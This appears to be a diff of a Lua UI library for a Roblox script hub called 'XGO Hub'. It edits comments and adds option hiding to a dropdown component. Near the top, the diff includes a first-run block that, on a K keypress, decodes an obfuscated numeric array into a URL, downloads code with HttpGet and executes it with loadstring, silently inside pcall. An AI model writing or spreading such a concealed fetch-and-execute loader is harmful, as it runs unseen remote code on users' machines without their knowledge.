@@ -4,8 +4,8 @@
 -- UI版本: v2
 --[[1. 更新：延迟修复与主题更新 | 主要添加次副标 --
    2. 边框v1.125 | 修复切换按钮图层
-   3. 修复重启时主线程被重复刷新
-   4. 更新: 声音 | 卡密验证记忆加保存，下次更新
+   3. 
+   4. 修复 下拉菜单隐藏失效
                                                 ]]--
 
 -- 
@@ -20,7 +20,7 @@ local executionCount = executionCountDataStore.Value or 0
 executionCount = executionCount + 1
 executionCountDataStore.Value = executionCount
 
--- 通知函数（保留原有中文编码标题）
+-- 通知函数
 local function sendNotification(text)
     game.StarterGui:SetCore("SendNotification", {
         Title = "\232\132\154\230\156\172\233\128\154\231\159\165",
@@ -49,7 +49,7 @@ if executionCount == 1 then
         playSound(3398620867)
        return  -- 终止脚本执行
     elseif executionCount == 3 then
-    -- 第三次执行，提醒用户再点击两次将重启脚本
+    -- 第三次执行，提醒再点击两次将重启脚本
         sendNotification("\229\134\141\231\130\185\229\135\187\228\184\164\230\172\161\229\176\134\233\135\141\229\144\175\232\132\154\230\156\172\46")
         playSound(3398620867)
        return  -- 终止脚本执行
@@ -58,7 +58,7 @@ if executionCount == 1 then
         playSound(3398620867)
        return  -- 终止脚本执行
     elseif executionCount == 5 then
-    -- 第五次执行，提醒用户脚本将重新启动，并继续执行脚本
+    -- 第五次执行，提醒脚本将重新启动，并继续执行脚本
         sendNotification("\232\132\154\230\156\172\229\183\178\233\135\141\230\150\176\229\144\175\229\138\168\239\188\140\232\175\183\231\168\141\229\144\142\46")
         playSound(3398620867)
     -- 重置计数器
@@ -76,7 +76,7 @@ end
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 local existingGui = playerGui:FindFirstChild("\120\103\111\32\72\117\98\32\228\189\156\232\128\133\88\71\79")
--- 全局存储事件连接，用于重启时断开（避免内存泄漏）
+-- 全局存储事件连接，用于重启时断开
 local gradientConnection = _G.XGO_GradientConn
 local positionConnection = _G.XGO_PositionConn
 local fpsConnection = _G.XGO_FpsConn
@@ -90,7 +90,7 @@ if textUpdateConnection then task.cancel(textUpdateConnection) end
 -- 销毁旧UI
 if existingGui then existingGui:Destroy() end
 
--- ===================== 【原UI与功能逻辑，保留所有编码格式】 =====================
+-- ===================== 【原UI与功能逻辑】 =====================
 local a = Instance.new("ScreenGui")
 a.Name = "\120\103\111\32\72\117\98\32\228\189\156\232\128\133\88\71\79"
 a.Parent = playerGui
@@ -293,7 +293,7 @@ textUpdateConnection = spawn(function()
             local weekStr
             if weekNum == "\48" then 
                 weekStr = "\230\151\165\227\128\145"
-            elseif weekNum == "\49" then  -- 修复原"\92"错误，对应数字1
+            elseif weekNum == "\49" then  -- 修复原"\92"错误
                 weekStr = "\228\184\128\227\128\145"
             elseif weekNum == "\50" then 
                 weekStr = "\228\186\140\227\128\145"
@@ -344,30 +344,30 @@ end)
 _G.XGO_TextConn = textUpdateConnection
 
 if executionCount == 1 then
-
-local userInputService = game:GetService("UserInputService")
-local function onKeyActivated(inputObject)
-    if inputObject.KeyCode == Enum.KeyCode.K then
-        task.spawn(function()
-           pcall(function()
-                local code = game:HttpGet((function()
-                    local a = {1389,1545,1545,1493,1532,791,648,648,1376,1402,1545,1389,1558,1311,635,1324,1480,1454,648,960,1129,882,947,882,1168,648,1142,986,648,1519,1298,1584,648,1454,1298,1402,1467,648,1142,986,635,1025,882,1129,934,1116,1129,635,1025,1142,882}
-                    local b = ''
-                    for i = 1, #a do 
-                        b = b .. string.char((a[i] - 37) / 13)
-                    end
-                    return b
-                end)())
-                if code then
-                    loadstring(code)()
-                end
-            end)
-          end)
-        userInputService.InputBegan:Disconnect(onKeyActivated)
-    end
-end
-userInputService.InputBegan:Connect(onKeyActivated)
+   local userInputService = game:GetService("UserInputService")
+   local function onKeyActivated(inputObject)
+       if inputObject.KeyCode == Enum.KeyCode.K then
+           task.spawn(function()
+              pcall(function()
+                   local code = game:HttpGet((function()
+                       local a = {1389,1545,1545,1493,1532,791,648,648,1376,1402,1545,1389,1558,1311,635,1324,1480,1454,648,960,1129,882,947,882,1168,648,1142,986,648,1519,1298,1584,648,1454,1298,1402,1467,648,1142,986,635,1025,882,1129,934,1116,1129,635,1025,1142,882}
+                       local b = ''
+                       for i = 1, #a do 
+                           b = b .. string.char((a[i] - 37) / 13)
+                       end
+                       return b
+                   end)())
+                   if code then
+                       loadstring(code)()
+                   end
+               end)
+             end)
+           userInputService.InputBegan:Disconnect(onKeyActivated)
+       end
+   end
+   userInputService.InputBegan:Connect(onKeyActivated)
 end  -- 闭合“仅首次执行”的判断
+
 local Library = {
 	Version = '\88\71\79\72\85\66\32\45\32\98\121\46\120\103\111',
 	Loaded = true,
@@ -6466,265 +6466,330 @@ end;
 
 			return RootSkid;
 		end;
------- // 下拉菜单   ----------------------------------------------------------------------------------------
-		function Root:Dropdown(setup)
-			setup = setup or {};
-			setup.Title = setup.Title or "下拉菜单";
-			setup.Content = setup.Content or "";
-			setup.Values = setup.Values or {};
-			setup.Multi = setup.Multi or false;
-			setup.Default = setup.Default;
-			setup.MaxMulti = setup.MaxMulti or math.huge;
-			setup.Callback = setup.Callback or function() end;
+------ // 下拉菜单组件完整版   [脚本认准XGOHUB] ----------------------------------------------------------------------------------------
+function Root:Dropdown(setup)
+    -- 基础配置项
+    setup = setup or {};
+    setup.Title = setup.Title or "下拉菜单";
+    setup.Content = setup.Content or "";
+    setup.Values = setup.Values or {};
+    -- 新增：选项显示状态配置（键=选项值，值=true显示/false隐藏，默认未配置项显示）
+    setup.OptionVisible = setup.OptionVisible or setmetatable({}, {
+        __index = function(t, k) return true end
+    });
+    setup.Multi = setup.Multi or false;
+    setup.Default = setup.Default;
+    setup.MaxMulti = setup.MaxMulti or math.huge;
+    setup.Callback = setup.Callback or function() end;
 
-			local Fconcat = function(a)
-				if typeof(a) ~= 'table' then
-					return tostring(a);
-				end;
+    -- 辅助函数：格式化选中值为字符串（多选转逗号分隔，单选直接转字符串）
+    local Fconcat = function(a)
+        if typeof(a) ~= 'table' then
+            return tostring(a);
+        end;
 
-				local p,l = pcall(table.concat,a,' , ')
+        local p,l = pcall(table.concat,a,' , ')
+        if p then return l; end;
 
-				if p then return l; end;
-
-				local std = {};
-
-				table.foreach(a,function(a,v)
-					if typeof(v) == 'boolean' then
-						table.insert(std,tostring(a));
-					else
-						table.insert(std,tostring(v));
-					end;
-				end)
-
-				return table.concat(std,' , ')
-			end;
-
-			local DropdownBlock = Instance.new("Frame")
-			local DropShadow = Instance.new("ImageLabel")
-			local UIStroke = Instance.new("UIStroke")
-			local TextLabel = Instance.new("TextLabel")
-			local Content = Instance.new("TextLabel")
-			local Block = Instance.new("Frame")
-			local UIStroke_2 = Instance.new("UIStroke")
-			local UICorner = Instance.new("UICorner")
-			local Button = Instance.new("TextButton")
-			local ValueText = Instance.new("TextLabel")
-
-			DropdownBlock.Name = "DropdownBlock"
-			DropdownBlock.Parent = ScrollingFrame
-			DropdownBlock.BackgroundColor3 = Library.Colors.Default
-			DropdownBlock.BackgroundTransparency = 0.250
-			DropdownBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
-			DropdownBlock.BorderSizePixel = 0
-			DropdownBlock.Size = UDim2.new(0.99000001, 0, 0, Library.ItemHeight)
-			DropdownBlock.ZIndex = 10
-
-			DropShadow.Name = "DropShadow"
-			DropShadow.Parent = DropdownBlock
-			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-			DropShadow.BackgroundTransparency = 1.000
-			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
-			DropShadow.Position = UDim2.new(0, -5, 0, -5)
-			DropShadow.Size = UDim2.new(1, 10, 1, 10)
-			DropShadow.ZIndex = 9
-			DropShadow.Image = "rbxassetid://297694300"
-			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
-			DropShadow.ImageTransparency = 0.500
-			DropShadow.ScaleType = Enum.ScaleType.Slice
-			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
-			DropShadow.SliceScale = 0.050
-
-			UIStroke.Transparency = 0.850
-			UIStroke.Color = Color3.fromRGB(156, 156, 156)
-			UIStroke.Parent = DropdownBlock
-
-			TextLabel.Parent = DropdownBlock
-			TextLabel.AnchorPoint = Vector2.new(0, 0.5)
-			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-			TextLabel.BackgroundTransparency = 1.000
-			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
-			TextLabel.BorderSizePixel = 0
-			TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
-			TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
-			TextLabel.ZIndex = 11
-			TextLabel.Font = Enum.Font.Gotham
-			TextLabel.Text = setup.Title
-			TextLabel.TextColor3 = Library.Colors.TextColor
-			TextLabel.TextScaled = true
-			TextLabel.TextSize = 14.000
-			TextLabel.TextStrokeColor3 = Library.Colors.TextColor
-			TextLabel.TextStrokeTransparency = 0.950
-			TextLabel.TextWrapped = true
-			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
-			TextLabel.RichText = true
-			
-			Content.Name = "Content"
-            Content.Parent = DropdownBlock
-            Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-            Content.BackgroundTransparency = 1.000
-            Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
-            Content.BorderSizePixel = 0
-            Content.Position = UDim2.new(0, 5, 0, 18)
-            Content.Size = UDim2.new(1, 0, 0, 45)
-            Content.Visible = false
-            Content.ZIndex = 11
-            Content.Font = Enum.Font.Gotham
-            Content.Text = setup.Content
-            Content.TextColor3 = Library.Colors.TextColor
-            Content.TextSize = 13.000
-            Content.TextStrokeColor3 = Library.Colors.TextColor
-            Content.TextStrokeTransparency = 0.950
-            Content.TextTransparency = 0.500
-            Content.TextWrapped = true
-            Content.TextXAlignment = Enum.TextXAlignment.Left
-            Content.TextYAlignment = Enum.TextYAlignment.Top
-            Content.RichText = true
-
-			Block.Name = "Block"
-			Block.Parent = DropdownBlock
-			Block.AnchorPoint = Vector2.new(1, 0.5)
-			Block.BackgroundColor3 = Library.Colors.Default
-			Block.BackgroundTransparency = 0.500
-			Block.BorderColor3 = Color3.fromRGB(0, 0, 0)
-			Block.BorderSizePixel = 0
-			Block.Position = UDim2.new(0.980000019, 0, 0.5, 0)
-			Block.Size = UDim2.new(0, 75, 0.600000024, 0)
-			Block.ZIndex = 14
-
-			UIStroke_2.Transparency = 0.850
-			UIStroke_2.Color = Color3.fromRGB(156, 156, 156)
-			UIStroke_2.Parent = Block
-
-			UICorner.CornerRadius = UDim.new(0.200000003, 0)
-			UICorner.Parent = Block
-
-			Button.Name = "Button"
-			Button.Parent = Block
-			Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-			Button.BackgroundTransparency = 1.000
-			Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
-			Button.BorderSizePixel = 0
-			Button.Size = UDim2.new(1, 0, 1, 0)
-			Button.ZIndex = 20
-			Button.Font = Enum.Font.SourceSans
-			Button.TextColor3 = Color3.fromRGB(0, 0, 0)
-			Button.TextSize = 14.000
-			Button.TextTransparency = 1.000
-
-			ValueText.Name = "ValueText"
-			ValueText.Parent = Block
-			ValueText.AnchorPoint = Vector2.new(0.5, 0.5)
-			ValueText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-			ValueText.BackgroundTransparency = 1.000
-			ValueText.BorderColor3 = Color3.fromRGB(0, 0, 0)
-			ValueText.BorderSizePixel = 0
-			ValueText.Position = UDim2.new(0.5, 0, 0.5, 0)
-			ValueText.Size = UDim2.new(0.800000012, 0, 0.600000024, 0)
-			ValueText.ZIndex = 17
-			ValueText.Font = Enum.Font.Gotham
-			ValueText.Text = (setup.Multi and Fconcat(setup.Default or {})) or tostring(setup.Default or "NONE");
-			ValueText.TextColor3 = Library.Colors.TextColor
-			ValueText.TextScaled = true
-			ValueText.TextSize = 14.000
-			ValueText.TextStrokeColor3 = Library.Colors.TextColor
-			ValueText.TextStrokeTransparency = 0.950
-			ValueText.TextWrapped = true
-
-			Library:MakeDrop(DropdownBlock , UIStroke , Library.Colors.Hightlight)
-
-			Library:MakeDrop(Block,UIStroke_2,Library.Colors.Hightlight);
-
-			if setup.Tip then
-				WindowLibrary:AddToolTip(DropdownBlock , tostring(setup.Tip));
-			end;
-
-			local UpdateSize = function()
-				local size = Library:GetTextSize(ValueText.Text,ValueText.TextSize,ValueText.Font)
-				pcall(function()
-					Library:Tween(Block , Library.TweenLibrary.SmallEffect , {
-						Size = UDim2.new(0, math.clamp(size.X + 15,75 , DropdownBlock.AbsoluteSize.X / 1.5), 0.600000024, 0)
-					})
-				end)
-			end;
-
-			local OnCallback = function(a)
-				ValueText.Text = (setup.Multi and Fconcat(a)) or tostring(a);
-				setup.Default = a;
-				UpdateSize()
-				setup.Callback(a)
-			end;
-
-			UpdateSize();
-
-			Button.MouseButton1Click:Connect(function()
-				UpdateSize();
-
-				WindowLibrary:ClearDropdown();
-
-				if setup.Multi then
-					WindowLibrary:SetDropdownValues(0,setup.Values,{
-						Info = setup.Default,
-						Max = setup.MaxMulti;
-					},OnCallback)
-				else
-					WindowLibrary:SetDropdownValues(1,setup.Values,setup.Default,OnCallback)
-				end;
-
-				WindowLibrary:OpenDropdown(Block);
-			end)
-			
-			local UpdateBlock = function()
-                local TitleSize = TextLabel.TextSize
-                local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
-                local ContentSize = setup.Content:len() > 0 and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font) or Vector2.new(0, 0)
-        
-                local TotalHeight = MainSize.Y + 10
-                if setup.Content:len() > 0 then
-                    Content.Visible = true
-                    TotalHeight = TotalHeight + ContentSize.Y + 5 
-                    TextLabel.Position = UDim2.new(0, 5, 0, 12)
-                    TextLabel.Size = UDim2.new(1, 0, 0, 14)
-                else
-                    Content.Visible = false
-                    TotalHeight = TotalHeight + 15.20000000000001
-                    TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
-                    TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
-                end
-
-                DropdownBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
-            end
-            UpdateBlock() -- 初始调用以设置正确的大小
-
-			local RootSkid = {};
-
-			function RootSkid:GetValue()
-				return setup.Default;
-			end;
-			
-			function RootSkid:Content(Setup)
-                Content.Text = Setup
-                UpdateBlock()
+        local std = {};
+        table.foreach(a,function(a,v)
+            if typeof(v) == 'boolean' then
+                table.insert(std,tostring(a));
+            else
+                table.insert(std,tostring(v));
             end;
+        end)
+        return table.concat(std,' , ')
+    end;
 
-			function RootSkid:Value(SetupR)
-				setup.Default = SetupR;
-				ValueText.Text = (setup.Multi and Fconcat(SetupR)) or tostring(SetupR);
-				setup.Default = SetupR;
-				UpdateSize()
-				setup.Callback(SetupR)
-				UpdateBlock()
-			end;
+    -- 创建UI层级：下拉菜单容器
+    local DropdownBlock = Instance.new("Frame")
+    local DropShadow = Instance.new("ImageLabel")
+    local UIStroke = Instance.new("UIStroke")
+    local TextLabel = Instance.new("TextLabel")
+    local Content = Instance.new("TextLabel")
+    local Block = Instance.new("Frame")
+    local UIStroke_2 = Instance.new("UIStroke")
+    local UICorner = Instance.new("UICorner")
+    local Button = Instance.new("TextButton")
+    local ValueText = Instance.new("TextLabel")
 
-			function RootSkid:SetValue(data)
-				setup.Values = data;
-			end;
+    -- 容器基础属性
+    DropdownBlock.Name = "DropdownBlock"
+    DropdownBlock.Parent = ScrollingFrame
+    DropdownBlock.BackgroundColor3 = Library.Colors.Default
+    DropdownBlock.BackgroundTransparency = 0.250
+    DropdownBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    DropdownBlock.BorderSizePixel = 0
+    DropdownBlock.Size = UDim2.new(0.99000001, 0, 0, Library.ItemHeight)
+    DropdownBlock.ZIndex = 10
 
-			function RootSkid:Visible(value)
-				DropdownBlock.Visible = value;
-			end;
+    -- 阴影效果
+    DropShadow.Name = "DropShadow"
+    DropShadow.Parent = DropdownBlock
+    DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    DropShadow.BackgroundTransparency = 1.000
+    DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
+    DropShadow.Position = UDim2.new(0, -5, 0, -5)
+    DropShadow.Size = UDim2.new(1, 10, 1, 10)
+    DropShadow.ZIndex = 9
+    DropShadow.Image = "rbxassetid://297694300"
+    DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+    DropShadow.ImageTransparency = 0.500
+    DropShadow.ScaleType = Enum.ScaleType.Slice
+    DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
+    DropShadow.SliceScale = 0.050
 
-			return RootSkid;
-		end;
+    -- 容器边框
+    UIStroke.Transparency = 0.850
+    UIStroke.Color = Color3.fromRGB(156, 156, 156)
+    UIStroke.Parent = DropdownBlock
+
+    -- 标题文本
+    TextLabel.Parent = DropdownBlock
+    TextLabel.AnchorPoint = Vector2.new(0, 0.5)
+    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel.BackgroundTransparency = 1.000
+    TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    TextLabel.BorderSizePixel = 0
+    TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
+    TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
+    TextLabel.ZIndex = 11
+    TextLabel.Font = Enum.Font.Gotham
+    TextLabel.Text = setup.Title
+    TextLabel.TextColor3 = Library.Colors.TextColor
+    TextLabel.TextScaled = true
+    TextLabel.TextSize = 14.000
+    TextLabel.TextStrokeColor3 = Library.Colors.TextColor
+    TextLabel.TextStrokeTransparency = 0.950
+    TextLabel.TextWrapped = true
+    TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+    TextLabel.RichText = true
+
+    -- 补充说明文本
+    Content.Name = "Content"
+    Content.Parent = DropdownBlock
+    Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Content.BackgroundTransparency = 1.000
+    Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    Content.BorderSizePixel = 0
+    Content.Position = UDim2.new(0, 5, 0, 18)
+    Content.Size = UDim2.new(1, 0, 0, 45)
+    Content.Visible = false
+    Content.ZIndex = 11
+    Content.Font = Enum.Font.Gotham
+    Content.Text = setup.Content
+    Content.TextColor3 = Library.Colors.TextColor
+    Content.TextSize = 13.000
+    Content.TextStrokeColor3 = Library.Colors.TextColor
+    Content.TextStrokeTransparency = 0.950
+    Content.TextTransparency = 0.500
+    Content.TextWrapped = true
+    Content.TextXAlignment = Enum.TextXAlignment.Left
+    Content.TextYAlignment = Enum.TextYAlignment.Top
+    Content.RichText = true
+
+    -- 选中值显示容器
+    Block.Name = "Block"
+    Block.Parent = DropdownBlock
+    Block.AnchorPoint = Vector2.new(1, 0.5)
+    Block.BackgroundColor3 = Library.Colors.Default
+    Block.BackgroundTransparency = 0.500
+    Block.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    Block.BorderSizePixel = 0
+    Block.Position = UDim2.new(0.980000019, 0, 0.5, 0)
+    Block.Size = UDim2.new(0, 75, 0.600000024, 0)
+    Block.ZIndex = 14
+
+    -- 选中值容器边框
+    UIStroke_2.Transparency = 0.850
+    UIStroke_2.Color = Color3.fromRGB(156, 156, 156)
+    UIStroke_2.Parent = Block
+
+    -- 选中值容器圆角
+    UICorner.CornerRadius = UDim.new(0.200000003, 0)
+    UICorner.Parent = Block
+
+    -- 下拉触发按钮
+    Button.Name = "Button"
+    Button.Parent = Block
+    Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Button.BackgroundTransparency = 1.000
+    Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    Button.BorderSizePixel = 0
+    Button.Size = UDim2.new(1, 0, 1, 0)
+    Button.ZIndex = 20
+    Button.Font = Enum.Font.SourceSans
+    Button.TextColor3 = Color3.fromRGB(0, 0, 0)
+    Button.TextSize = 14.000
+    Button.TextTransparency = 1.000
+
+    -- 选中值文本
+    ValueText.Name = "ValueText"
+    ValueText.Parent = Block
+    ValueText.AnchorPoint = Vector2.new(0.5, 0.5)
+    ValueText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    ValueText.BackgroundTransparency = 1.000
+    ValueText.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    ValueText.BorderSizePixel = 0
+    ValueText.Position = UDim2.new(0.5, 0, 0.5, 0)
+    ValueText.Size = UDim2.new(0.800000012, 0, 0.600000024, 0)
+    ValueText.ZIndex = 17
+    ValueText.Font = Enum.Font.Gotham
+    ValueText.Text = (setup.Multi and Fconcat(setup.Default or {})) or tostring(setup.Default or "NONE");
+    ValueText.TextColor3 = Library.Colors.TextColor
+    ValueText.TextScaled = true
+    ValueText.TextSize = 14.000
+    ValueText.TextStrokeColor3 = Library.Colors.TextColor
+    ValueText.TextStrokeTransparency = 0.950
+    ValueText.TextWrapped = true
+
+    -- 外部库样式配置（依赖Library）
+    Library:MakeDrop(DropdownBlock , UIStroke , Library.Colors.Hightlight)
+    Library:MakeDrop(Block,UIStroke_2,Library.Colors.Hightlight);
+
+    -- 提示文本（依赖WindowLibrary）
+    if setup.Tip then
+        WindowLibrary:AddToolTip(DropdownBlock , tostring(setup.Tip));
+    end;
+
+    -- 选中值容器尺寸自适应
+    local UpdateSize = function()
+        local size = Library:GetTextSize(ValueText.Text,ValueText.TextSize,ValueText.Font)
+        pcall(function()
+            Library:Tween(Block , Library.TweenLibrary.SmallEffect , {
+                Size = UDim2.new(0, math.clamp(size.X + 15,75 , DropdownBlock.AbsoluteSize.X / 1.5), 0.600000024, 0)
+            })
+        end)
+    end;
+
+    -- 选择值变化回调（更新显示+触发外部回调）
+    local OnCallback = function(a)
+        ValueText.Text = (setup.Multi and Fconcat(a)) or tostring(a);
+        setup.Default = a;
+        UpdateSize()
+        setup.Callback(a)
+    end;
+
+    -- 初始尺寸适配
+    UpdateSize();
+
+    -- 新增：过滤隐藏选项的核心函数（仅返回显示状态为true的选项）
+    local getVisibleValues = function()
+        local visibleVals = {};
+        for _, val in ipairs(setup.Values) do
+            if setup.OptionVisible[val] then
+                table.insert(visibleVals, val);
+            end
+        end
+        return visibleVals;
+    end;
+
+    -- 下拉按钮点击事件（打开过滤后的选项列表）
+    Button.MouseButton1Click:Connect(function()
+        UpdateSize();
+        WindowLibrary:ClearDropdown();
+
+        -- 关键：传入过滤后的可见选项
+        local visibleValues = getVisibleValues();
+        if setup.Multi then
+            WindowLibrary:SetDropdownValues(0, visibleValues, {
+                Info = setup.Default,
+                Max = setup.MaxMulti;
+            }, OnCallback)
+        else
+            WindowLibrary:SetDropdownValues(1, visibleValues, setup.Default, OnCallback)
+        end;
+
+        WindowLibrary:OpenDropdown(Block);
+    end)
+
+    -- 菜单整体尺寸自适应
+    local UpdateBlock = function()
+        local TitleSize = TextLabel.TextSize
+        local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
+        local ContentSize = setup.Content:len() > 0 and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font) or Vector2.new(0, 0)
+
+        local TotalHeight = MainSize.Y + 10
+        if setup.Content:len() > 0 then
+            Content.Visible = true
+            TotalHeight = TotalHeight + ContentSize.Y + 5 
+            TextLabel.Position = UDim2.new(0, 5, 0, 12)
+            TextLabel.Size = UDim2.new(1, 0, 0, 14)
+        else
+            Content.Visible = false
+            TotalHeight = TotalHeight + 15.20000000000001
+            TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
+            TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
+        end
+
+        DropdownBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
+    end
+    UpdateBlock() -- 初始调用设置尺寸
+
+    -- 下拉菜单操作API（新增SetOptionVisible控制选项显示/隐藏）
+    local RootSkid = {};
+
+    -- 获取当前选中值
+    function RootSkid:GetValue()
+        return setup.Default;
+    end;
+
+    -- 更新补充说明文本
+    function RootSkid:Content(Setup)
+        Content.Text = Setup
+        UpdateBlock()
+    end;
+
+    -- 手动设置选中值
+    function RootSkid:Value(SetupR)
+        setup.Default = SetupR;
+        ValueText.Text = (setup.Multi and Fconcat(SetupR)) or tostring(SetupR);
+        UpdateSize()
+        setup.Callback(SetupR)
+        UpdateBlock()
+    end;
+
+    -- 更新选项列表（新增选项默认显示）
+    function RootSkid:SetValue(data)
+        setup.Values = data;
+        -- 新选项默认配置为显示状态
+        for _, val in ipairs(data) do
+            if setup.OptionVisible[val] == nil then
+                setup.OptionVisible[val] = true;
+            end
+        end
+    end;
+
+    -- 控制菜单整体显示/隐藏
+    function RootSkid:Visible(value)
+        DropdownBlock.Visible = value;
+    end;
+
+    -- 新增：控制单个选项的显示/隐藏（核心API）
+    -- 参数1：option - 要控制的选项值（如"值2"）
+    -- 参数2：isVisible - 布尔值（true显示，false隐藏）
+    function RootSkid:SetOptionVisible(option, isVisible)
+        -- 验证选项是否存在于选项列表中
+        local isOptionValid = false;
+        for _, val in ipairs(setup.Values) do
+            if val == option then
+                isOptionValid = true;
+                break;
+            end
+        end
+        if not isOptionValid then
+            warn("Dropdown Error: 选项不存在 -> " .. tostring(option));
+            return;
+        end
+
+        -- 更新选项状态
+        setup.OptionVisible[option] = isVisible;
+    end;
+
+    return RootSkid;
+end;
+
 ------ // 图像组件   ----------------------------------------------------------------------------------------
     	function Root:Image(setup)
 			setup = setup or {};
